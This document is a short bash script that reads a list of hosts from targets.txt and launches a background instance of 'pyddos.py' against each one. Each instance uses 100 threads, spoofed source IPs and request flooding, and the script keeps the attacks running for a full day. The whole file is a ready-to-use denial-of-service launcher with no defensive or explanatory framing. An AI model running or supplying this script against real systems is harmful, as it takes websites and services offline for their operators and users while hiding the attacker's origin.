#!/bin/bash

for T in $(cat targets.txt); do
    (python3 pyddos.py -d "$T" -T 100 --fakeip -Request &)
done
sleep 86400
exit 0
